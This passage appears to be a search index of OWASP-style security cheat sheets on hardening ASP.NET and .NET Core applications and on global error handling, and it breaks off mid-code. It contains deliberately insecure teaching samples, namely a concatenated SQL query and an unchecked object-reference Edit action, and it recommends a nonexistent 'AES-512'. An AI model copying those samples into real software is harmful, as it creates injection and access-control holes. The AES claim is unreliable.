\"https://{HTTP_HOST}/{R:1}\" redirectType= \"Permanent\" /> </rule> </rules> <outboundRules> <rule name= \"Add HSTS Header\" enabled= \"true\" > <match serverVariable= \"RESPONSE_Strict_Transport_Security\" pattern= \".*\" /> <conditions> <add input= \"{HTTPS}\" pattern= \"on\" ignoreCase= \"true\" /> </conditions> <action type= \"Rewrite\" value= \"max-age=15768000\" /> </rule> </outboundRules> </rewrite> </system.webServer> </configuration> Remove the version header. <httpRuntime enableVersionHeader= \"false\" /> Also remove the Server header. HttpContext . Current . Response . Headers . Remove ( \"Server\" );","title":"ASP NET Web Forms Guidance"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#http-validation-and-encoding","text":"Do not disable validateRequest in the web.config or the page setup. This value enables limited XSS protection in ASP.NET and should be left intact as it provides partial prevention of Cross Site Scripting. Complete request validation is recommended in addition to the built-in protections. The 4.5 version of the .NET Frameworks includes the AntiXssEncoder library, which has a comprehensive input encoding library for the prevention of XSS. Use it. Whitelist allowable values anytime user input is accepted. Validate the URI format using Uri.IsWellFormedUriString .","title":"HTTP validation and encoding"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#forms-authentication","text":"Use cookies for persistence when possible. Cookieless auth will default to UseDeviceProfile . Don't trust the URI of the request for persistence of the session or authorization. It can be easily faked. Reduce the forms authentication timeout from the default of 20 minutes to the shortest period appropriate for your application. If slidingExpiration is used this timeout resets after each request, so active users won't be affected. If HTTPS is not used, slidingExpiration should be disabled. Consider disabling slidingExpiration even with HTTPS. Always implement proper access controls. Compare user provided username with User.Identity.Name . Check roles against User.Identity.IsInRole . Use the ASP.NET Membership provider and role provider , but review the password storage. The default storage hashes the password with a single iteration of SHA-1 which is rather weak. The ASP.NET MVC4 template uses ASP.NET Identity instead of ASP.NET Membership, and ASP.NET Identity uses PBKDF2 by default which is better. Review the OWASP Password Storage Cheat Sheet for more information. Explicitly authorize resource requests. Leverage role based authorization using User.Identity.IsInRole .","title":"Forms authentication"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#asp-net-mvc-guidance","text":"ASP.NET MVC (Model\u2013View\u2013Controller) is a contemporary web application framework that uses more standardized HTTP communication than the Web Forms postback model. The OWASP Top 10 2017 lists the most prevalent and dangerous threats to web security in the world today and is reviewed every 3 years. This section is based on this. Your approach to securing your web application should be to start at the top threat A1 below and work down, this will ensure that any time spent on security will be spent most effectively spent and cover the top threats first and lesser threats afterwards. After covering the top 10 it is generally advisable to assess for other threats or get a professionally completed Penetration Test.","title":"ASP NET MVC Guidance"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#a1-injection","text":"","title":"A1 Injection"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#sql-injection","text":"DO: Using an object relational mapper (ORM) or stored procedures is the most effective way of countering the SQL Injection vulnerability. DO: Use parameterized queries where a direct sql query must be used. More Information can be found here . e.g. In entity frameworks: var sql = @ \"Update [User] SET FirstName = @FirstName WHERE Id = @Id\" ; context . Database . ExecuteSqlCommand ( sql , new SqlParameter ( \"@FirstName\" , firstname ), new SqlParameter ( \"@Id\" , id )); DO NOT: Concatenate strings anywhere in your code and execute them against your database (Known as dynamic sql). NB: You can still accidentally do this with ORMs or Stored procedures so check everywhere. e.g string strQry = \"SELECT * FROM Users WHERE UserName='\" + txtUser . Text + \"' AND Password='\" + txtPassword . Text + \"'\" ; EXEC strQry // SQL Injection vulnerability ! DO: Practice Least Privilege - Connect to the database using an account with a minimum set of permissions required to do it's job i.e. not the sa account","title":"SQL Injection"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#os-injection","text":"Information about OS Injection can be found on this cheat sheet . DO: Use System.Diagnostics.Process.Start to call underlying OS functions. e.g System . Diagnostics . Process process = new System . Diagnostics . Process (); System . Diagnostics . ProcessStartInfo startInfo = new System . Diagnostics . ProcessStartInfo (); startInfo . FileName = \"validatedCommand\" ; startInfo . Arguments = \"validatedArg1 validatedArg2 validatedArg3\" ; process . StartInfo = startInfo ; process . Start (); DO: Use whitelist validation on all user supplied input. Input validation prevents improperly formed data from entering an information system. For more information please see the Input Validation Cheat Sheet . e.g Validating user input using IPAddress.TryParse Method //User input string ipAddress = \"127.0.0.1\" ; //check to make sure an ip address was provided if (! string . IsNullOrEmpty ( ipAddress )) { // Create an instance of IPAddress for the specified address string (in // dotted-quad, or colon-hexadecimal notation). if ( IPAddress . TryParse ( ipAddress , out var address )) { // Display the address in standard notation. return address . ToString (); } else { //ipAddress is not of type IPAddress ... } ... }","title":"OS Injection"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#ldap-injection","text":"Almost any characters can be used in Distinguished Names. However, some must be escaped with the backslash \\ escape character. A table showing which characters that should be escaped for Active Directory can be found at the in the LDAP Injection Prevention Cheat Sheet . NB: The space character must be escaped only if it is the leading or trailing character in a component name, such as a Common Name. Embedded spaces should not be escaped. More information can be found here .","title":"LDAP injection"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#a2-broken-authentication","text":"DO: Use ASP.net Core Identity . ASP.net Core Identity framework is well configured by default, where it uses secure password hashes and an individual salt. Identity uses the PBKDF2 hashing function for passwords, and they generate a random salt per user. DO: Set secure password policy e.g ASP.net Core Identity //startup.cs services . Configure < IdentityOptions >( options => { // Password settings options . Password . RequireDigit = true ; options . Password . RequiredLength = 8 ; options . Password . RequireNonAlphanumeric = true ; options . Password . RequireUppercase = true ; options . Password . RequireLowercase = true ; options . Password . RequiredUniqueChars = 6 ; options . Lockout . DefaultLockoutTimeSpan = TimeSpan . FromMinutes ( 30 ); options . Lockout . MaxFailedAccessAttempts = 3 ; options . SignIn . RequireConfirmedEmail = true ; options . User . RequireUniqueEmail = true ; }); DO: Set a cookie policy e.g //startup.cs services . ConfigureApplicationCookie ( options => { options . Cookie . HttpOnly = true ; options . Cookie . Expiration = TimeSpan . FromHours ( 1 ) options . SlidingExpiration = true ; });","title":"A2 Broken Authentication"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#a3-sensitive-data-exposure","text":"DO NOT: Store encrypted passwords . DO: Use a strong hash to store password credentials. For hash refer to this section . DO: Enforce passwords with a minimum complexity that will survive a dictionary attack i.e. longer passwords that use the full character set (numbers, symbols and letters) to increase the entropy. DO: Use a strong encryption routine such as AES-512 where personally identifiable data needs to be restored to it's original format. Protect encryption keys more than any other asset, please find more information of storing encryption keys at rest . Apply the following test: Would you be happy leaving the data on a spreadsheet on a bus for everyone to read. Assume the attacker can get direct access to your database and protect it accordingly. More information can be found here . DO: Use TLS 1.2 for your entire site. Get a free certificate LetsEncrypt.org . DO NOT: Allow SSL, this is now obsolete . DO: Have a strong TLS policy (see SSL Best Practices ), use TLS 1.2 wherever possible. Then check the configuration using SSL Test or TestSSL . DO: Ensure headers are not disclosing information about your application. See HttpHeaders.cs , Dionach StripHeaders , disable via web.config or startup.cs : More information on Transport Layer Protection can be found here . e.g Web.config <system.web> <httpRuntime enableVersionHeader= \"false\" /> </system.web> <system.webServer> <security> <requestFiltering removeServerHeader= \"true\" /> </security> <httpProtocol> <customHeaders> <add name= \"X-Content-Type-Options\" value= \"nosniff\" /> <add name= \"X-Frame-Options\" value= \"DENY\" /> <add name= \"X-Permitted-Cross-Domain-Policies\" value= \"master-only\" /> <add name= \"X-XSS-Protection\" value= \"0\" /> <remove name= \"X-Powered-By\" /> </customHeaders> </httpProtocol> </system.webServer> e.g Startup.cs app . UseHsts ( hsts => hsts . MaxAge ( 365 ). IncludeSubdomains ()); app . UseXContentTypeOptions (); app . UseReferrerPolicy ( opts => opts . NoReferrer ()); app . UseXXssProtection ( options => options . FilterDisabled ()); app . UseXfo ( options => options . Deny ()); app . UseCsp ( opts => opts . BlockAllMixedContent () . StyleSources ( s => s . Self ()) . StyleSources ( s => s . UnsafeInline ()) . FontSources ( s => s . Self ()) . FormActions ( s => s . Self ()) . FrameAncestors ( s => s . Self ()) . ImageSources ( s => s . Self ()) . ScriptSources ( s => s . Self ()) ); For more information about headers can be found here .","title":"A3 Sensitive Data Exposure"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#a4-xml-external-entities-xxe","text":"Please refer to the XXE cheat sheet so more detailed information, which can be found here . XXE attacks occur when an XML parse does not properly process user input that contains external entity declaration in the doctype of an XML payload. Below are the three most common XML Processing Options for .NET.","title":"A4 XML External Entities (XXE)"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#a5-broken-access-control","text":"","title":"A5 Broken Access Control"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#weak-account-management","text":"Ensure cookies are sent via httpOnly: CookieHttpOnly = true , Reduce the time period a session can be stolen in by reducing session timeout and removing sliding expiration: ExpireTimeSpan = TimeSpan . FromMinutes ( 60 ), SlidingExpiration = false See here for full startup code snippet Ensure cookie is sent over HTTPS in the production environment. This should be enforced in the config transforms: <httpCookies requireSSL= \"true\" xdt:Transform= \"SetAttributes(requireSSL)\" /> <authentication> <forms requireSSL= \"true\" xdt:Transform= \"SetAttributes(requireSSL)\" /> </authentication> Protect LogOn, Registration and password reset methods against brute force attacks by throttling requests (see code below), consider also using ReCaptcha. [HttpPost] [AllowAnonymous] [ValidateAntiForgeryToken] [AllowXRequestsEveryXSecondsAttribute(Name = \"LogOn\", Message = \"You have performed this action more than {x} times in the last {n} seconds.\", Requests = 3, Seconds = 60)] public async Task < ActionResult > LogOn ( LogOnViewModel model , string returnUrl ) DO NOT: Roll your own authentication or session management, use the one provided by .Net DO NOT: Tell someone if the account exists on LogOn, Registration or Password reset. Say something like 'Either the username or password was incorrect', or 'If this account exists then a reset token will be sent to the registered email address'. This protects against account enumeration. The feedback to the user should be identical whether or not the account exists, both in terms of content and behavior: e.g. if the response takes 50% longer when the account is real then membership information can be guessed and tested.","title":"Weak Account management"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#missing-function-level-access-control","text":"DO: Authorize users on all externally facing endpoints. The .NET framework has many ways to authorize a user, use them at method level: [Authorize(Roles = \"Admin\")] [HttpGet] public ActionResult Index ( int page = 1 ) or better yet, at controller level: [Authorize] public class UserController You can also check roles in code using identity features in .net: System.Web.Security.Roles.IsUserInRole(userName, roleName) You can find more information here on Access Control and here for Authorization.","title":"Missing function-level access control"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#insecure-direct-object-references","text":"When you have a resource (object) which can be accessed by a reference (in the sample below this is the id ) then you need to ensure that the user is intended to be there // Insecure public ActionResult Edit ( int id ) { var user = _context . Users . FirstOrDefault ( e => e . Id == id ); return View ( \"Details\" , new UserViewModel ( user ); } // Secure public ActionResult Edit ( int id ) { var user = _context . Users . FirstOrDefault ( e => e . Id == id ); // Establish user has right to edit the details if ( user . Id != _userIdentity . GetUserId ()) { HandleErrorInfo error = new HandleErrorInfo ( new Exception ( \"INFO: You do not have permission to edit these details\" )); return View ( \"Error\" , error ); } return View ( \"Edit\" , new UserViewModel ( user ); } More information can be found here for Insecure Direct Object Reference.","title":"Insecure Direct object references"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#a6-security-misconfiguration","text":"","title":"A6 Security Misconfiguration"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#debug-and-stack-trace","text":"Ensure debug and trace are off in production. This can be enforced using web.config transforms: <compilation xdt:Transform= \"RemoveAttributes(debug)\" /> <trace enabled= \"false\" xdt:Transform= \"Replace\" /> DO NOT: Use default passwords DO: (When using TLS) Redirect a request made over Http to https: e.g Global.asax.cs protected void Application_BeginRequest () { #if !DEBUG // SECURE: Ensure any request is returned over SSL/TLS in production if (! Request . IsLocal && ! Context . Request . IsSecureConnection ) { var redirect = Context . Request . Url . ToString () . ToLower ( CultureInfo . CurrentCulture ) . Replace ( \"http:\" , \"https:\" ); Response . Redirect ( redirect ); } #endif } e.g Startup.cs in the Configure() app . UseHttpsRedirection ();","title":"Debug and Stack Trace"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#cross-site-request-forgery","text":"DO NOT: Send sensitive data without validating Anti-Forgery-Tokens ( .NET / .NET Core ). DO: Send the anti-forgery token with every POST/PUT request:","title":"Cross-site request forgery"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#using-net-framework","text":"using ( Html . BeginForm ( \"LogOff\" , \"Account\" , FormMethod . Post , new { id = \"logoutForm\" , @class = \"pull-right\" })) { @Html . AntiForgeryToken () < ul class = \"nav nav-pills\" > < li role = \"presentation\" > Logged on as @User . Identity . Name </ li > < li role = \"presentation\" > < a href = \"javascript:document.getElementById('logoutForm').submit()\" > Log off </ a > </ li > </ ul > } Then validate it at the method or preferably the controller level: [HttpPost] [ValidateAntiForgeryToken] public ActionResult LogOff () Make sure the tokens are removed completely for invalidation on logout. /// <summary> /// SECURE: Remove any remaining cookies including Anti-CSRF cookie /// </summary> public void RemoveAntiForgeryCookie ( Controller controller ) { string [] allCookies = controller . Request . Cookies . AllKeys ; foreach ( string cookie in allCookies ) { if ( controller . Response . Cookies [ cookie ] != null && cookie == \"__RequestVerificationToken\" ) { controller . Response . Cookies [ cookie ]. Expires = DateTime . Now . AddDays (- 1 ); } } }","title":"Using .NET Framework"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#using-net-core-20-or-later","text":"Starting with .NET Core 2.0 it is possible to automatically generate and verify the antiforgery token . If you are using tag-helpers , which is the default for most web project templates, then all forms will automatically send the anti-forgery token. You can check if tag-helpers are enabled by checking if your main _ViewImports.cshtml file contains: @addTagHelper *, Microsoft . AspNetCore . Mvc . TagHelpers IHtmlHelper.BeginForm also sends anti-forgery-tokens automatically. Unless you are using tag-helpers or IHtmlHelper.BeginForm , you must use the requisite helper on forms as seen here: < form action = \"RelevantAction\" > @Html.AntiForgeryToken() </ form > To automatically validate all requests other than GET, HEAD, OPTIONS and TRACE you need to add a global action filter with the AutoValidateAntiforgeryToken attribute inside your Startup.cs as mentioned in the following article : services . AddMvc ( options => { options . Filters . Add ( new AutoValidateAntiforgeryTokenAttribute ()); }); If you need to disable the attribute validation for a specific method on a controller you can add the IgnoreAntiforgeryToken attribute to the controller method (for MVC controllers) or parent class (for Razor pages): [IgnoreAntiforgeryToken] [HttpDelete] public IActionResult Delete () [IgnoreAntiforgeryToken] public class UnsafeModel : PageModel If you need to also validate the token on GET, HEAD, OPTIONS or TRACE - requests you can add the ValidateAntiforgeryToken attribute to the controller method (for MVC controllers) or parent class (for Razor pages): [HttpGet] [ValidateAntiforgeryToken] public IActionResult DoSomethingDangerous () [HttpGet] [ValidateAntiforgeryToken] public class SafeModel : PageModel In case you can't use a global action filter, add the AutoValidateAntiforgeryToken attribute to your controller classes or razor page models: [AutoValidateAntiforgeryToken] public class UserController [AutoValidateAntiforgeryToken] public class SafeModel : PageModel","title":"Using .NET Core 2.0 or later"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#using-net-core-20-or-net-framework-with-ajax","text":"You will need to attach the anti-forgery token to AJAX requests. If you are using jQuery in an ASP.NET Core MVC view this can be achieved using this snippet: @ inject Microsoft . AspNetCore . Antiforgery . IAntiforgery antiforgeryProvider $ . ajax ( { type : \"POST\" , url : '@Url.Action(\"Action\", \"Controller\")' , contentType : \"application/x-www-form-urlencoded; charset=utf-8\" , data : { id : id , '__RequestVerificationToken' : '@antiforgeryProvider.GetAndStoreTokens(this.Context).RequestToken' } }) If you are using the .NET Framework, you can find some code snippets here . More information can be found here for Cross-Site Request Forgery.","title":"Using .Net Core 2.0 or .NET Framework with AJAX"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#a7-cross-site-scripting-xss","text":"DO NOT: Trust any data the user sends you, prefer white lists (always safe) over black lists You get encoding of all HTML content with MVC3, to properly encode all content whether HTML, javascript, CSS, LDAP etc use the Microsoft AntiXSS library: Install-Package AntiXSS Then set in config: <system.web> <httpRuntime targetFramework= \"4.5\" enableVersionHeader= \"false\" encoderType= \"Microsoft.Security.Application.AntiXssEncoder, AntiXssLibrary\" maxRequestLength= \"4096\" /> DO NOT: Use the [AllowHTML] attribute or helper class @Html.Raw unless you really know that the content you are writing to the browser is safe and has been escaped properly. DO: Enable a Content Security Policy , this will prevent your pages from accessing assets it should not be able to access (e.g. a malicious script): <system.webServer> <httpProtocol> <customHeaders> <add name= \"Content-Security-Policy\" value= \"default-src 'none'; style-src 'self'; img-src 'self'; font-src 'self'; script-src 'self'\" /> More information can be found here for Cross-Site Scripting.","title":"A7 Cross-Site Scripting (XSS)"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#a8-insecure-deserialization","text":"Information about Insecure Deserialization can be found on this cheat sheet . DO NOT: Accept Serialized Objects from Untrusted Sources DO: Validate User Input Malicious users are able to use objects like cookies to insert malicious information to change user roles. In some cases, hackers are able to elevate their privileges to administrator rights by using a pre-existing or cached password hash from a previous session. DO: Prevent Deserialization of Domain Objects DO: Run the Deserialization Code with Limited Access Permissions If a deserialized hostile object tries to initiate a system processes or access a resource within the server or the host's OS, it will be denied access and a permission flag will be raised so that a system administrator is made aware of any anomalous activity on the server. More information can be found here: Deserialization Cheat Sheet","title":"A8 Insecure Deserialization"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#a9-using-components-with-known-vulnerabilities","text":"DO: Keep the .Net framework updated with the latest patches DO: Keep your NuGet packages up to date, many will contain their own vulnerabilities. DO: Run the OWASP Dependency Checker against your application as part of your build process and act on any high level vulnerabilities.","title":"A9 Using Components with Known Vulnerabilities"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#a10-insufficient-logging-monitoring","text":"DO: Ensure all login, access control failures and server-side input validation failures can be logged with sufficient user context to identify suspicious or malicious accounts. DO: Establish effective monitoring and alerting so suspicious activities are detected and responded to in a timely fashion. DO NOT: Log generic error messages such as: csharp Log.Error(\"Error was thrown\"); rather log the stack trace, error message and user ID who caused the error. DO NOT: Log sensitive data such as user's passwords.","title":"A10 Insufficient Logging &amp; Monitoring"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#logging","text":"What Logs to Collect and more information about Logging can be found on this cheat sheet . .NET Core come with a LoggerFactory, which is in Microsoft.Extensions.Logging. More information about ILogger can be found here . How to log all errors from the Startup.cs , so that anytime an error is thrown it will be logged. public void Configure ( IApplicationBuilder app , IHostingEnvironment env ) { if ( env . IsDevelopment ()) { _isDevelopment = true ; app . UseDeveloperExceptionPage (); } //Log all errors in the application app . UseExceptionHandler ( errorApp => { errorApp . Run ( async context => { var errorFeature = context . Features . Get < IExceptionHandlerFeature >(); var exception = errorFeature . Error ; Log . Error ( String . Format ( \"Stacktrace of error: {0}\" , exception . StackTrace . ToString ())); }); }); app . UseAuthentication (); app . UseMvc (); } } e.g Injecting into the class constructor, which makes writing unit test simpler. It is recommended if instances of the class will be created using dependency injection (e.g. MVC controllers). The below example shows logging of all unsuccessful log in attempts. public class AccountsController : Controller { private ILogger _Logger ; public AccountsController ( ILogger logger ) { _Logger = logger ; } [HttpPost] [AllowAnonymous] [ValidateAntiForgeryToken] public async Task < IActionResult > Login ( LoginViewModel model ) { if ( ModelState . IsValid ) { var result = await _signInManager . PasswordSignInAsync ( model . Email , model . Password , model . RememberMe , lockoutOnFailure : false ); if ( result . Succeeded ) { //Log all successful log in attempts Log . Information ( String . Format ( \"User: {0}, Successfully Logged in\" , model . Email )); //Code for successful login } else { //Log all incorrect log in attempts Log . Information ( String . Format ( \"User: {0}, Incorrect Password\" , model . Email )); } } ... Logging levels for ILogger are listed below, in order of high to low importance:","title":"Logging"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#monitoring","text":"Monitoring allow us to validate the performance and health of a running system through key performance indicators. In .NET a great option to add monitoring capabilities is Application Insights . More information about Logging and Monitoring can be found here .","title":"Monitoring"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#owasp-2013","text":"Below is vulnerability not discussed in OWASP 2017","title":"OWASP 2013"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#a10-unvalidated-redirects-and-forwards","text":"A protection against this was introduced in Mvc 3 template. Here is the code: public async Task < ActionResult > LogOn ( LogOnViewModel model , string returnUrl ) { if ( ModelState . IsValid ) { var logonResult = await _userManager . TryLogOnAsync ( model . UserName , model . Password ); if ( logonResult . Success ) { await _userManager . LogOnAsync ( logonResult . UserName , model . RememberMe ); return RedirectToLocal ( returnUrl ); ... private ActionResult RedirectToLocal ( string returnUrl ) { if ( Url . IsLocalUrl ( returnUrl )) { return Redirect ( returnUrl ); } else { return RedirectToAction ( \"Landing\" , \"Account\" ); } } Other advice: Protect against Clickjacking and man in the middle attack from capturing an initial Non-TLS request, set the X-Frame-Options and Strict-Transport-Security (HSTS) headers. Full details here Protect against a man in the middle attack for a user who has never been to your site before. Register for HSTS preload Maintain security testing and analysis on Web API services. They are hidden inside MEV sites, and are public parts of a site that will be found by an attacker. All of the MVC guidance and much of the WCF guidance applies to the Web API. Unvalidated Redirects and Forwards Cheat Sheet . More information: For more information on all of the above and code samples incorporated into a sample MVC5 application with an enhanced security baseline go to Security Essentials Baseline project","title":"A10 Unvalidated redirects and forwards"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#xaml-guidance","text":"Work within the constraints of Internet Zone security for your application. Use ClickOnce deployment. For enhanced permissions, use permission elevation at runtime or trusted application deployment at install time.","title":"XAML Guidance"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#windows-forms-guidance","text":"Use partial trust when possible. Partially trusted Windows applications reduce the attack surface of an application. Manage a list of what permissions your app must use, and what it may use, and then make the request for those permissions declaratively at runtime. Use ClickOnce deployment. For enhanced permissions, use permission elevation at runtime or trusted application deployment at install time.","title":"Windows Forms Guidance"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#wcf-guidance","text":"Keep in mind that the only safe way to pass a request in RESTful services is via HTTP POST , with TLS enabled . GETs are visible in the querystring , and a lack of TLS means the body can be intercepted. Avoid BasicHttpBinding . It has no default security configuration. Use WSHttpBinding instead. Use at least two security modes for your binding. Message security includes security provisions in the headers. Transport security means use of SSL. TransportWithMessageCredential combines the two. Test your WCF implementation with a fuzzer like the ZAP .","title":"WCF Guidance"},{"location":"cheatsheets/Error_Handling_Cheat_Sheet.html","text":"Error Handling Cheat Sheet \u00b6 Introduction \u00b6 Error handling is a part of the overall security of an application. Except in movies, an attack always begins with a Reconnaissance phase in which the attacker will try to gather as much technical information (often name and version properties) as possible about the target, such as the application server, frameworks, libraries, etc. Unhandled errors can assist an attacker in this initial phase, which is very important for the rest of the attack. The following link provides a description of the different phases of an attack. Context \u00b6 Issues at the error handling level can reveal a lot of information about the target and can also be used to identify injection points in the target's features. Below is an example of the disclosure of a technology stack, here the Struts2 and Tomcat versions, via an exception rendered to the user: HTTP Status 500 - For input string: \"null\" type Exception report message For input string: \"null\" description The server encountered an internal error that prevented it from fulfilling this request. exception java.lang.NumberFormatException: For input string: \"null\" java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:492) java.lang.Integer.parseInt(Integer.java:527) sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) java.lang.reflect.Method.invoke(Method.java:606) com.opensymphony.xwork2.DefaultActionInvocation.invokeAction(DefaultActionInvocation.java:450) com.opensymphony.xwork2.DefaultActionInvocation.invokeActionOnly(DefaultActionInvocation.java:289) com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:252) org.apache.struts2.interceptor.debugging.DebuggingInterceptor.intercept(DebuggingInterceptor.java:256) com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:246) ... note: The full stack trace of the root cause is available in the Apache Tomcat/7.0.56 logs. Below is an example of disclosure of a SQL query error, along with the site installation path, that can be used to identify an injection point: Warning: odbc_fetch_array() expects parameter /1 to be resource, boolean given in D:\\app\\index_new.php on line 188 The OWASP Testing Guide provides different techniques to obtain technical information from an application. Objective \u00b6 The article shows how to configure a global error handler at the configuration level when possible, otherwise at code level, in different technologies, in order to ensure that if an unexpected error occurs then a generic response is returned by the application but the error is traced on server side for investigation. The following schema shows the target approach: As most recent application topologies are API based , we assume in this article that the backend exposes only a REST API and does not contain any user interface content. For the error logging operation itself, the logging cheat sheet should be used. This article focuses on the error handling part. Proposition \u00b6 For each technology, a setup will be proposed with configuration and code snippet. Java classic web application \u00b6 For this kind of application, a global error handler can be configured at the web.xml deployment descriptor level. We propose here a configuration that can be used from Servlet specification version 2.5 and above. With this configuration, any unexpected error will cause a redirection to the page error.jsp in which the error will be traced and a generic response will be returned. Configuration of the redirection into the web.xml file: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" ns= \"http://java.sun.com/xml/ns/javaee\" xsi:schemaLocation= \"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\" version= \"3.0\" > ... <error-page> <exception-type> java.lang.Exception </exception-type> <location> /error.jsp </location> </error-page> ... </web-app> Content of the error.jsp file: <% @ page language = \"java\" isErrorPage = \"true\" contentType = \"application/json; charset=UTF-8\" pageEncoding = \"UTF-8\" %> <% String errorMessage = exception . getMessage (); //Log the exception via the content of the implicit variable named \"exception\" //... //We build a generic response with a JSON format because we are in a REST API app context //We also add an HTTP response header to indicate to the client app that the response is an error response . setHeader ( \"X-ERROR\" , \"true\" ); response . setStatus ( 200 ); %> { \"message\" : \"An error occur, please retry\" } Java SpringMVC/SpringBoot web application \u00b6 With SpringMVC or SpringBoot , you can define a global error handler by simply implementing the following kind of class in your project. We indicate to the handler, via the annotation @ExceptionHandler , to act when any exception extending the class java.lang.Exception is thrown by the application. import net.minidev.json.JSONObject ; import org.springframework.http.HttpHeaders ; import org.springframework.http.HttpStatus ; import org.springframework.http.MediaType ; import org.springframework.http.ResponseEntity ; import org.springframework.web.bind.annotation.ControllerAdvice ; import org.springframework.web.bind.annotation.ExceptionHandler ; import org.springframework.web.context.request.WebRequest ; /** * Global error handler in charge of returning a generic response in case of unexpected error situation. */ @ControllerAdvice public class RestResponseEntityExceptionHandler { @ExceptionHandler ( value = { Exception . class }) public ResponseEntity < Object > handleGlobalError ( RuntimeException exception , WebRequest request ) { //Log the exception via the content of the parameter named \"exception\" //... //We build a generic response with a JSON format because we are in a REST API app context //We also add an HTTP response header to indicate to the client app that the response is an error HttpHeaders responseHeaders = new HttpHeaders (); responseHeaders . setContentType ( MediaType . APPLICATION_JSON ); responseHeaders . set ( \"X-ERROR\" , \"true\" ); JSONObject responseBody = new JSONObject (); responseBody . put ( \"message\" , \"An error occur, please retry\" ); ResponseEntity < JSONObject > response = new ResponseEntity <> ( responseBody , responseHeaders , HttpStatus . OK ); return ( ResponseEntity ) response ; } } References: Exception handling with Spring Exception handling with SpringBoot ASP NET Core web application \u00b6 With ASP.NET Core , you can define a global error handler by indicating that the exception handler is a dedicated API Controller. Content of the API Controller dedicated to the error handling: using Microsoft.AspNetCore.Authorization ; using Microsoft.AspNetCore.Diagnostics ; using Microsoft.AspNetCore.Mvc ; using System ; using System.Collections.Generic ; using System.Net ; namespace MyProject.Controllers { /// <summary> /// API Controller used to intercept and handle all unexpected exception /// </summary> [Route(\"api/[controller] \")] [ApiController] [AllowAnonymous] public class ErrorController : ControllerBase { /// <summary> /// Action that will be invoked for any call to this Controller in order to handle the current error /// </summary> /// <returns>A generic error formatted as JSON because we are in a REST API app context</returns> [HttpGet] [HttpPost] [HttpHead] [HttpDelete] [HttpPut] [HttpOptions] [HttpPatch] public JsonResult Handle () { //Get the exception that has implied the call to this controller Exception exception = HttpContext . Features . Get < IExceptionHandlerFeature >()?. Error ; //Log the exception via the content of the variable named \"exception\" if it is not NULL //... //We build a generic response with a JSON format because we are in a REST API app context //We also add an HTTP response header to indicate to the client app that the response //is an error var responseBody = new Dictionary < String , String >{ { \"message\" , \"An error occur, please retry\" } }; JsonResult response = new JsonResult ( responseBody ); response . StatusCode = ( int ) HttpStatusCode . OK ; Request . HttpContext . Response . Headers . Remove ( \"X-ERROR\" ); Request . HttpContext . Response . Headers . Add ( \"X-ERROR\" , \"true\" ); return response ; } } } Definition in the application Startup.cs file of the mapping of the exception handler to the dedicated error handling API controller: using Microsoft.AspNetCore.Builder ; using Microsoft.AspNetCore.Hosting ; using Microsoft.AspNetCore.Mvc ; using Microsoft.Extensions.Configuration ; using Microsoft.Extensions.DependencyInjection ; namespace MyProject { public class Startup { ... public void Configure ( IApplicationBuilder app , IHostingEnvironment env ) { //First we configure the error handler middleware! //We enable the global error handler in others environments than DEV //because debug page are useful during implementation if ( env . IsDevelopment ()) { app . UseDeveloperExceptionPage (); } else { //Our global handler is defined on \"/api/error\" URL so we indicate to the //exception handler to call this API controller //on any unexpected exception raised by the application app . UseExceptionHandler ( \"/api/error\" ); //To customize the response content type and text, use the overload of //UseStatusCodePages that takes a content type and format string. app . UseStatusCodePages ( \"text/plain\" , \"Status code page, status code: {0}\" ); } //We configure others middlewares, remember that the declaration order is important... app . UseMvc (); //... } } } References: Exception handling with ASP.Net Core ASP NET Web API web application \u00b6 With ASP.NET Web API (from the standard .NET framework and not from the .NET Core framework), you can define and register handlers in order to trace and handle any error that occurs in the application. Definition of the handler for the tracing of the error details: using System ; using System.Web.Http.ExceptionHandling ; namespace MyProject.Security { /// <summary> /// Global logger used to trace any error that occurs at application wide level /// </summary> public class GlobalErrorLogger : ExceptionLogger { /// <summary> /// Method in charge of the management of the error from a tracing point of view /// </summary> /// <param name=\"context\">Context containing the error details</param> public override void Log ( ExceptionLoggerContext context ) { //Get the exception Exception 